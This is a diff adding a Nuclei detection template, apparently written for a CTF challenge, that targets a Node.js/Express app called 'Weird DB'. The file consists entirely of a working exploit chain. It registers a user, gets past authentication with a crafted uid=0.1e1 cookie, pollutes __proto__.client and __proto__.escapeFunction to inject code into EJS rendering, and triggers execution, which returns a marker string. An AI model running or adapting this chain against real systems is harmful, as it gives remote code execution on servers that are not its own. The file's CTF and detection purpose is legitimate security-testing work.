@@ -1,0 +1,83 @@
+id: weird-db-rce-detect-v5
+
+info:
+  name: Weird DB - RCE Detection (Global Cookie Fix)
+  author: ijebin
+  severity: critical
+  description: |
+    Auth Bypass & Prototype Pollution.
+    쿠키 자동 병합을 전역에서 차단하고, UID=1 환경(인스턴스 초기화)에서 작동하도록 설계됨.
+  tags: ctf, rce, nodejs, prototype-pollution, express
+
+http:
+  - raw:
+      # [Step 1] 유저 등록
+      - |
+        POST /register HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username": "{{randstr}}", "password": "{{randstr}}"}
+
+    # [중요] 쿠키 재사용을 전역 레벨에서 비활성화 (자동 병합 방지)
+    cookie-reuse: false
+
+    extractors:
+      - type: regex
+        name: passwd_hash
+        part: header
+        group: 1
+        regex:
+          - "passwd=([a-f0-9]+)"
+        internal: true
+
+  # [Step 2 ~ 5] 공격 수행
+  - raw:
+      # 초기화 (Cleanup)
+      - |
+        GET /api/unset?key=__proto__.client HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: uid=0.1e1; password={{passwd_hash}}
+
+      - |
+        GET /api/unset?key=__proto__.escapeFunction HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: uid=0.1e1; password={{passwd_hash}}
+      
+      - |
+        GET /api/unset?key=__proto__.outputFunctionName HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: uid=0.1e1; password={{passwd_hash}}
+
+      # Prototype Pollution 1
+      - |
+        GET /api/set?key=__proto__.client&value=true HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: uid=0.1e1; password={{passwd_hash}}
+
+      # Prototype Pollution 2
+      - |
+        GET /api/set?key=__proto__.escapeFunction&value=1%3Breturn+%27NUCLEI_DETECTED%27%3B HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: uid=0.1e1; password={{passwd_hash}}
+
+      # Trigger RCE
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: uid=0.1e1; password={{passwd_hash}}
+
+    # 여기도 명시적으로 비활성화
+    cookie-reuse: false
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        name: rce-success
+        part: body
+        words:
+          - "NUCLEI_DETECTED"
+      
+      - type: status
+        status:
+          - 200
